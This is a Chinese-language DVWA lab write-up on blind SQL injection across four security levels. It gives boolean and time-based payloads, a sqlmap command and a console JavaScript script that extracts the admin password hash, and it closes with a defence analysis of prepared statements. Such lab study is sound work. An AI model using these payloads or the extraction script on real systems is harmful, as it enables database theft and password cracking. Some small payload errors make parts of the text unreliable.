DVWA-SQL注入（Blind盲注）

- 盲注含义

1、什么是"盲注"？为什么需要它？

先回顾一下你之前学的 SQL Injection（显注）：

| 对比项 | 普通 SQL 注入（显注） | 盲注（Blind） |
|---|---|---|
| 页面回显 | 直接显示查询结果（first_name、last_name） | 只返回"存在/不存在"两种状态 |
| 数据获取方式 | UNION SELECT 直接读 | 通过 AND 条件 逐位猜解 |
| 难度 | 低 | 高（要写脚本逐字符爆破） |

DVWA Blind 的核心场景：你输入一个 ID，页面只告诉你：

✅ User ID exists in the database.（存在）

❌ User ID is MISSING from the database.（不存在，且返回 404）

关键点：页面不告诉你具体数据是什么，只告诉你"有"还是"没有"。这就像问一个人问题，他只会点头或摇头，不会说话。你要通过精心设计的问题（SQL 条件），一点一点把数据库里的内容"猜"出来。

2、盲注的两种类型

1）布尔盲注（Boolean-Based）

利用 AND 条件 让查询结果为真或假，根据页面返回 "exists" / "MISSING" 判断条件真假。

核心 payload 结构：

1 AMD (SELECT SUBSTRING(user(),1,1))='r' --

若 user() 第 1 个字符 = 'r' → 条件为真 → 页面显示 "exists"

若不等于 → 条件为假 → 页面显示 "MISSING"

2）时间盲注（Time-Based）

当页面没有布尔差异（两种状态回显完全一样）时，用 SLEEP() 让数据库延迟响应，根据响应时间判断真假。

1 AND IF((SELECT SUBSTRING(user(),1,1))='r', SLEEP(2), 0) --

字符猜对 → 延迟 2 秒

猜错 → 无延迟

DVWA Low/Medium/High 都有布尔差异，所以主要用布尔盲注；时间盲注作为补充手段学习。

3、四级源码对比

| 级别 | 输入方式 | $id 处理 | SQL 语句 | 引号 | 回显差异 |
|---|---|---|---|---|---|
| Low | GET ?id= | 无过滤 | WHERE user_id = '$id' | 单引号 | exists / MISSING + 404 |
| Medium | POST | mysqli_real_escape_string | WHERE user_id = $id | 无引号 | exists / MISSING（无 404） |
| High | Cookie id | 无过滤 | WHERE user_id = '$id' LIMIT 1 | 单引号 | exists / MISSING + 随机 sleep |
| Impossible | POST | is_numeric + intval + PDO 预处理 | WHERE user_id = :id | 参数化 | —（不可注入） |

防御演进逻辑：

- Low → Medium：加了转义，但没加引号，数字型注入绕过转义 ❌（典型反面教材）

- Medium → High：加了引号，但从 Cookie 取输入，且 LIMIT 1 限制结果（但引号闭合仍可绕过）

- High → Impossible：PDO 参数化查询，从根本上杜绝注入 ✅

- Low级

- 源码分析

![](images/8-DVWA-SQL注入学习-Blind/8-DVWA-SQL注入学习-Blind_001.png)

$id = $_GET['id'];

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

- $id 直接拼入 SQL，单引号包裹

- 无任何过滤、无转义、无类型检查

- 页面有明确的布尔差异（exists / MISSING）

- 布尔盲注实操

- 确认注入点

在 DVWA 页面输入框输入以下 ID，点 Submit：

（1）1

→ 显示 User ID exists in the database.（ID=1 存在，admin 用户）

（2）100

→ 显示 User ID is MISSING from the database.（ID=100 不存在）

- 确认单引号闭合+布尔注入

（1）输入： 1’ AND '1'='1

→ 拼接后 SQL：WHERE user_id = '1' AND '1'='1' → 恒真 → exists ✅

（2）输入： 1' AND '1'='2

→ 拼接后 SQL：WHERE user_id = '1' AND '1'='2' → 恒假 → MISSING ✅

✅ 确认布尔盲注可用：通过控制 AND 后的条件，可以判断任意 SQL 表达式的真假。

- 获取当前是数据库名长度

- 输入：

1' AND LENGTH(database())=4 --

→ database() 返回当前库名 dvwa，长度 4 → exists ✅

（2）对照实验：

1' AND LENGTH(database())=5 --

→ MISSING ❌

✅ 确认数据库名长度 = 4。

- 逐字符猜解数据库名

用 SUBSTRING(database(), 位置, 1) 逐字符猜，配合 ASCII 范围二分：

- 输入 1' AND ASCII(SUBSTRING(database(),1,1))=100 --

→ d 的 ASCII = 100 → exists ✅

- 继续第2个字符：

1' AND ASCII(SUBSTRING(database(),2,1))=118 --

→ v 的 ASCII = 118 → exists ✅

以此类推，第 3、4 位是 w(119)、a(97)，最终确认数据库名 = dvwa。

（3）💡 二分优化：手动一个一个试 ASCII 值太慢。实际用 > 中间值 二分：

1' AND ASCII(SUBSTRING(database(),1,1))>100 --

真→范围缩小到 101-127；假→范围缩小到 0-99。7 次比较即可确定一个字符。

- 猜解表名（information_schema）

- 获取 dvwa 库下的表：

1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2 --

→ exists ✅（dvwa 有 2 张表：guestbook、users）

- 猜解第1·个表名第1个字符

1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=103 --

→ g(103) → exists ✅（guestbook）

- 猜解第2个表名第1个字符

1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),1,1))=117 --

→ u(117) → exists ✅（users）

- 猜解users表的列名

（1）猜user表的列数

1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND table_schema=database())=8 --

→ exists ✅（users 表有 8 列：user_id, first_name, last_name, user, password, avatar, last_login, failed_login）

（2）猜第 1 个列名第 1 个字符：

1' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))=117 --

→ u(117) → exists ✅（user_id）

- 猜解admin的password（核心目标）

users 表里 user='admin' 对应的 password 字段是 MD5 哈希，长度 32。

（1）先确认长度：

1' AND LENGTH((SELECT password FROM users WHERE user='admin' LIMIT 1))=32 --

→ exists ✅

- 逐字符猜第 1 位：

1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin' LIMIT 1),1,1))=53 --

→ 5(53) → exists ✅

实际 admin 密码哈希以 5f4dcc3b5aa765d61d8327deb882cf99 开头（password 的 MD5），第 1 位是 5。

3、⚠️ 手工盲注的痛点

如你所见，猜一个 32 位的 MD5 哈希，每位要试 7 次（二分），共 32 × 7 = 224 次请求。这还只是一个密码字段。

这就是为什么盲注几乎都配合自动化工具：

- sqlmap：sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs

- 自写 Python 脚本：二分查找 + requests 库

但手工盲注的价值在于理解原理，工具只是把这套逻辑自动化。面试官问"盲注原理"时，你能说清 SUBSTRING + ASCII + 二分，才是真懂。

- Medium级

- 源码分析

![](images/8-DVWA-SQL注入学习-Blind/8-DVWA-SQL注入学习-Blind_002.png)

$id = $_POST['id'];

$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);  // 转义

$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";  // ⚠️ 无引号！

三个关键变化（对比 Low）：

| 变化点 | Low | Medium |
|---|---|---|
| 提交方式 | GET ?id= | POST（地址栏看不到参数） |
| 过滤 | 无 | mysqli_real_escape_string 转义 ' " \ 等 |
| SQL 引号 | user_id = '$id' | user_id = $id ← 数字型，无引号 |

- 漏洞根因：转义形同虚设

mysqli_real_escape_string 的设计目的是：在引号内的字符串中，把 ' 转义成 \'，防止用户用 ' 闭合 SQL 字符串。

但是！ Medium 级的 SQL 语句根本没有引号包裹 $id：

WHERE user_id = $id     -- 数字型上下文，不需要引号

数字型注入根本不需要用单引号，所以转义函数完全无用武之地。这是典型的"防御与使用场景不匹配"的反面教材。

- 实操payload

![](images/8-DVWA-SQL注入学习-Blind/8-DVWA-SQL注入学习-Blind_003.png)

直接在F12修改就可以了

1）确认注入点（无引号闭合）

（1）输入： 1

→ exists ✅

- 输入：100

→ MISSING ❌

（3）直接用布尔条件，不需要单引号：

1 AND 1=1

→ WHERE user_id = 1 AND 1=1 → 恒真 → exists ✅

1 AND 1=2

→ WHERE user_id = 1 AND 1=2 → 恒假 → MISSING ✅

✅ 确认数字型布尔盲注可用（注意：payload 里没有任何单引号，所以转义函数没东西可转）。

2）获取数据库名

（1）1 AND LENGTH(database())=4

→ exists ✅（库名长度 4）

（2）1 AND ASCII(SUBSTRING(database(),1,1))=100

→ exists ✅（d）

（3）💡 对比 Low 级 payload：Low 级要写 1' AND ... -- （单引号闭合 + 注释），Medium 级直接 1 AND ...（无引号、无注释，因为后面没有多余的 SQL 需要注释掉）。

3）猜表名

1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2

→ exists ✅

注意这里的字符串 database() 是函数返回值，不是用户输入的字符串，所以不需要引号，转义函数管不着。

4）⚠️ 需要引号的地方怎么办？

猜表名具体字符时，table_schema 需要字符串 'users'。但 mysqli_real_escape_string 会把 ' 转义成 \'，导致 'users' 变成 \'users\'，SQL 语法错误。

绕过方法：用十六进制编码

users 的十六进制是 0x7573657273：

1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=0x6476776 LIMIT 0,1),1,1))=117

0x6476776 = dvwa 的十六进制（d=64 v=76 w=77 a=61 → 64767761，正确写法是 0x64767761）

这样完全绕开了引号，转义函数无效

实际你可以不用引号也能查，因为 table_schema=database() 等价：

1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),1,1))=117

→ exists ✅（猜到 users 表）

5）猜admin密码哈希

1 AND LENGTH((SELECT password FROM users WHERE user=0x61646d696e LIMIT 1))=32

0x61646d696e = admin 的十六进制（a=61 d=64 m=6d i=69 n=6e）

→ exists ✅（密码哈希长度 32）

1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE user=0x61646d696e LIMIT 1),1,1))=53

→ exists ✅（第 1 位是 5）

- 核心总结

| 要点 | 说明 |
|---|---|
| 漏洞类型 | 数字型注入（SQL 里 $id 无引号） |
| 转义为何失效 | mysqli_real_escape_string 只防"字符串型注入"，对数字型无效 |
| payload 特征 | 不需要单引号闭合、不需要 --  注释 |
| 字符串绕过 | 用十六进制 0x... 代替 'string' |
| 提交方式 | POST（Burp 改包 / 浏览器手动 POST / sqlmap --data） |

防御教训：转义函数必须配合引号包裹才有意义。正确写法应该是：

$id = mysqli_real_escape_string($conn, $_POST['id']);

$query = "WHERE user_id = '$id'";  // ✅ 引号 + 转义 = 字符串型安全

// 或者更好：

$id = intval($_POST['id']);         // ✅ 强制转整数

$query = "WHERE user_id = $id";    // ✅ 数字型安全

Medium 级的错误在于：转义了却没加引号，防御等于零。

- High级

- 源码分析

if( isset( $_COOKIE[ 'id' ] ) ) {        // ⚠️ 从 Cookie 取输入

$id = $_COOKIE[ 'id' ];

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";

if ($exists) { ... }

else {

if( rand( 0, 5 ) == 3 ) {         // ⚠️ 1/6 概率

sleep( rand( 2, 4 ) );         // 随机延迟 2-4 秒

}

header('404 Not Found');

$html .= 'User ID is MISSING from the database.';

}

}

三个关键变化（对比 Low/Medium）：

| 变化点 | Low | Medium | High |
|---|---|---|---|
| 输入来源 | GET ?id= | POST id | Cookie id |
| SQL 引号 | 单引号 | 无引号 | 单引号 |
| LIMIT | 无 | 无 | LIMIT 1 |
| 干扰 | 无 | 无 | 随机 sleep 2-4s |

2、三个关键点分析

1）Cookie 注入是什么？

普通请求：

POST /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1

Cookie: PHPSESSID=xxx; security=high; id=1

服务器代码 $_COOKIE['id'] 直接读取 Cookie 里的 id 值。用户可以任意修改自己的 Cookie，所以这等于另一个输入通道，且前端完全看不到这个参数（不像 GET 在地址栏、POST 在表单）。

2）LIMIT 1 的影响

WHERE user_id = '$id' LIMIT 1

LIMIT 1 限制只返回 1 行结果。对布尔盲注基本无影响（布尔条件只判断真假，不依赖返回行数），但对 UNION 注入有影响（只能返回 1 行数据）。

绕过方法：在 payload 里用自己的 LIMIT 覆盖：

1' AND ... --

--  注释掉后面的 LIMIT 1，不受影响。

3）随机sleep的干扰作用

if( rand(0,5) == 3 ) { sleep( rand(2,4) ); }

只在"MISSING"（条件为假）时才触发

1/6 概率延迟 2-4 秒

目的：干扰时间盲注。如果你想用 SLEEP(5) 做时间盲注，但页面本身就有随机延迟，你分不清是"你的 sleep"还是"服务器的随机 sleep"。

应对策略：

布尔盲注不受影响（看 exists/MISSING 文字，不看时间）

时间盲注需要多次测量取平均

3、实操方式

High 级没有输入框，参数从 Cookie 来。两种方法：

方法一：浏览器改 Cookie（直观）

F12 → Application 标签 → 左侧 Cookies → http://localhost

找到（或新建）名为 id 的 Cookie，值设为你的 payload

回到页面点 Submit（页面本身有个提交按钮触发查询）

但这样每次改 payload 都要手动编辑 Cookie，很麻烦。

方法二：Console 脚本（推荐）

（1）先在 Console 验证 Cookie 是否已设置

console.log('当前 cookies:', document.cookie);

应该看到类似：PHPSESSID=xxx; security=high; id=1

如果没有 id=1，说明 Cookie 没设置成功，手动设置：

document.cookie = "id=1; path=/dvwa/";

location.reload();

（2）直接在 Console 粘贴执行：

async function blind(payload) {

// 设置 id cookie 为 payload

document.cookie = "id=" + encodeURIComponent(payload) + "; path=/dvwa/";

// 发请求（不用手动设 Cookie 头，浏览器自动带上）

const r = await fetch('/dvwa/vulnerabilities/sqli_blind/', {

credentials: 'include'

});

const t = await r.text();

return t.includes('exists');

}

// 测试

blind("1").then(r => console.log('id=1:', r));

blind("1' AND '1'='1").then(r => console.log("1' AND '1'='1:", r));

blind("1' AND '1'='2").then(r => console.log("1' AND '1'='2:", r));

blind("1' AND LENGTH(database())=4 -- ").then(r => console.log('db len=4:', r));

blind("1' AND ASCII(SUBSTRING(database(),1,1))=100 -- ").then(r => console.log('db[1]=d:', r));

![](images/8-DVWA-SQL注入学习-Blind/8-DVWA-SQL注入学习-Blind_004.png)

4、Payload对比（Low vs High）

| Payload | Low | High |
|---|---|---|
| 闭合方式 | 1' AND '1'='1 | 1' AND '1'='1 |
| 注释 | -- | -- （注释掉 LIMIT 1） |
| 数据库长度 | 1' AND LENGTH(database())=4 -- | 完全相同 |
| 猜字符 | 1' AND ASCII(SUBSTRING(...))=N -- | 完全相同 |

关键认知：High 级相比 Low 级，布尔盲注 payload 几乎一模一样，只是输入通道从 GET 变成 Cookie。真正的防护加强在于 LIMIT 1（防 UNION）和随机 sleep（防时间盲注），但对布尔盲注无效。

5、完整爆破脚本（直接拿 admin 密码哈希）

把这段粘贴到 Console，它会自动二分查找 admin 的 32 位 MD5 哈希：

async function blind(payload) {

const r = await fetch('/dvwa/vulnerabilities/sqli_blind/', {

method: 'GET',

headers: {'Cookie': 'id=' + encodeURIComponent(payload) + '; PHPSESSID=' + document.cookie.match(/PHPSESSID=([^;]+)/)[1] + '; security=high'},

credentials: 'include'

});

const t = await r.text();

return t.includes('exists');

}

async function getString(subquery, len) {

let result = '';

for (let i = 1; i <= len; i++) {

let lo = 32, hi = 126;

while (lo < hi) {

const mid = Math.floor((lo + hi) / 2);

const p = `1' AND ASCII(SUBSTRING((${subquery}),${i},1))>${mid} -- `;

if (await blind(p)) {

lo = mid + 1;

} else {

hi = mid;

}

}

result += String.fromCharCode(lo);

console.log(`[${i}/${len}] ${result}`);

}

return result;

}

// 爆破 admin 密码哈希（32位 MD5）

console.log('开始爆破 admin password hash...');

getString("SELECT password FROM users WHERE user=0x61646d696e LIMIT 1", 32)

.then(hash => console.log('✅ admin password hash:', hash));

结果：
![](images/8-DVWA-SQL注入学习-Blind/8-DVWA-SQL注入学习-Blind_005.png)

拿到哈希后丢到 https://cmd5.com 或 hashcat -m 0 hash.txt password.dict 反查，得到明文 password。

6、总结

| 攻击点 | 说明 |
|---|---|
| 漏洞类型 | 字符串型 Cookie 注入（SQL 单引号闭合） |
| 输入通道 | Cookie id（前端完全看不到） |
| 闭合方式 | 1' AND '1'='1（单引号闭合 + 恒真） |
| LIMIT 1 影响 | 对布尔盲注无影响（看 exists/MISSING） |
| 随机 sleep 干扰 | 只影响时间盲注，布尔盲注不受影响 |
| 绕过技巧 | -- 注释掉LIMIT 1 和 sleep 逻辑 |
| 爆破效率 | 二分查找，每个字符 7 次请求，32 位哈希 ≈ 224 次请求 |

High 级核心认知

Cookie 也是一个输入通道：开发者常忽略 Cookie 是用户可控的，$_COOKIE['id'] 和 $_GET['id'] 一样危险

前端隐藏 ≠ 安全：High 级把输入藏到 Cookie 里，但攻击者照样能改 Cookie

随机 sleep 防御有限：只能轻微干扰时间盲注，对布尔盲注完全无效

LIMIT 1 防御有限：能挡 UNION 注入，但挡不住布尔盲注

- Impossible 级

1、核心防御代码（四层防御）

// ① CSRF Token 校验

checkToken( $_REQUEST['user_token'], $_SESSION['session_token'], 'index.php' );

// ② 输入类型检查

$id = $_GET['id'];

if( is_numeric( $id ) ) {              // 必须是数字

$id = intval( $id );               // 强制转整数

// ③ PDO 预处理语句（核心防御）

$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );

$data->bindParam( ':id', $id, PDO::PARAM_INT );  // 绑定为整数参数

$data->execute();

$exists = $data->rowCount();

}

// ④ 重新生成 CSRF Token

generateSessionToken();

2、四层防御逐层分析

① CSRF Token 校验

checkToken( $_REQUEST['user_token'], $_SESSION['session_token'], 'index.php' );

- 作用：防止跨站请求伪造。每次访问页面时服务器生成一个随机 token 存入 session，表单也带上这个 token。提交时校验 token 是否匹配。

- 为什么重要：没有 token，攻击者可以构造一个恶意页面 <img src="http://yoursite/dvwa/?id=恶意payload">，诱导已登录用户访问就触发注入。加上 token 后，攻击者无法预测 token 值，CSRF 攻击失效。

- 对你的盲注脚本的影响：我们的 Console 脚本 fetch 会带上当前页面的 cookie，但不会自动带上 token，所以会直接被拒绝。

② 输入类型检查 + 整数化

if( is_numeric( $id ) ) {

$id = intval( $id );

作用：双重保险。先检查是否为数字字符串（"1"、"1.5"、"+0123" 都通过），再用 intval() 强制转为整数。

对你 payload 的影响：

| Payload | is_numeric | intval 后 | 能否注入 |
|---|---|---|---|
| 1 | ✅ true | 1 | ❌ 无法注入 |
| 1 AND 1=1 | ❌ false（有空格） | — | ❌ 直接被拒 |
| 1' AND '1'='1 | ❌ false（有单引号） | — | ❌ 直接被拒 |
| 1 AND SLEEP(5) | ❌ false | — | ❌ 直接被拒 |

关键认知：is_numeric + intval 组合拳，直接过滤掉了所有非数字字符。任何包含字母、单引号、空格、AND/OR/SELECT 等关键字的 payload 都会被拒绝。这一层就足以挡住 99% 的注入。

③ PDO 预处理语句（最核心防御）

$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );

$data->bindParam( ':id', $id, PDO::PARAM_INT );

$data->execute();

这是 SQL 注入防御的黄金标准。

工作原理：

prepare() 先把 SQL 语句发送给数据库预编译，此时 SQL 结构已固定

:id 是一个占位符，数据库知道"这里将来会有一个参数"

bindParam() 把用户输入绑定到占位符，并指定类型为整数（PDO::PARAM_INT）

execute() 执行，数据库把用户输入当作纯数据而非 SQL 代码

为什么这样安全：

-- 假设用户输入: 1' AND '1'='1

-- 预处理后数据库执行的 SQL 实际是:

SELECT first_name, last_name FROM users WHERE user_id = '1\' AND \'1\'=\'1' LIMIT 1;

-- 用户输入被当作字符串字面值，不会被解析为 SQL 代码

预处理前后对比：

| 方式 | 用户输入 1' AND '1'='1 的命运 |
|---|---|
| 字符串拼接（Low/High） | 闭合引号，注入 SQL 代码 → 💀 被攻击 |
| 转义函数（Medium） | ' 变成 \'，但无引号包裹 → 💀 仍被攻击 |
| PDO 预处理（Impossible） | 整数化后变成 1，作为数据传入 → ✅ 安全 |

关键认知：预处理的本质是"代码"与"数据"分离。SQL 语句结构在 prepare 阶段就固定了，用户输入永远只能当数据，永远不能改变 SQL 的逻辑结构。

④ 重新生成 CSRF Token

generateSessionToken();

作用：每次请求后重新生成 token，防止 token 被重放攻击（攻击者截获一次 token 后无法复用）。

防御层次总结：

| 层次 | 防御机制 | 挡住什么 |
|---|---|---|
| 1 | CSRF Token | 跨站请求伪造 |
| 2 | is_numeric + intval | 所有非数字 payload |
| 3 | PDO 预处理 | 即使前两层失效，SQL 仍安全 |
| 4 | Token 重生成 | 防止 token 重放 |

3、四级对比总览

| 级别 | 输入处理 | SQL 构造方式 | 安全性 |
|---|---|---|---|
| Low | 无 | 字符串拼接 | 💀 |
| Medium | 转义函数 | 字符串拼接（无引号） | 💀 |
| High | 无 | 字符串拼接（Cookie + LIMIT） | 💀 |
| Impossible | is_numeric + intval | PDO 预处理 | ✅ |

4、为什么前三层都失败？

根本原因：前三层都试图用"过滤/转义用户输入"的方式防御注入，但这种方式有天然缺陷：

黑名单永远不全：过滤了 ' 还有 \"，过滤了 AND 还有 &&，过滤了 SELECT 还有注释绕过

转义与上下文不匹配：Medium 级转义了但没加引号，等于没转义

输入通道被忽略：High 级忽视了 Cookie 也是输入，没做任何过滤

唯一可靠的防御：参数化查询。不试图"清洗"输入，而是从根本上让用户输入无法被解析为 SQL 代码。

5、实操验证（可选）

如果你想亲手验证 Impossible 级确实无法注入，可以试试：

正常输入 1 → exists ✅

输入 1 AND 1=1 → MISSING（因为 is_numeric("1 AND 1=1") 返回 false，直接跳过查询）

输入 1' AND '1'='1 → MISSING（同上）

你的 Console 脚本会全返回 false（因为没有 CSRF token，请求被拒绝）

- 总结

| 级别 | 漏洞类型 | 关键 payload | 防御缺陷 |
|---|---|---|---|
| Low | GET 字符串型盲注 | 1' AND '1'='1 | 无任何过滤 |
| Medium | POST 数字型盲注 | 1 AND 1=1 | 转义无引号无效 |
| High | Cookie 字符串型盲注 | 1' AND '1'='1 -- | Cookie 无过滤，sleep/LIMIT 无效 |
| Impossible | —（不可注入） | — | CSRF + is_numeric + intval + PDO |
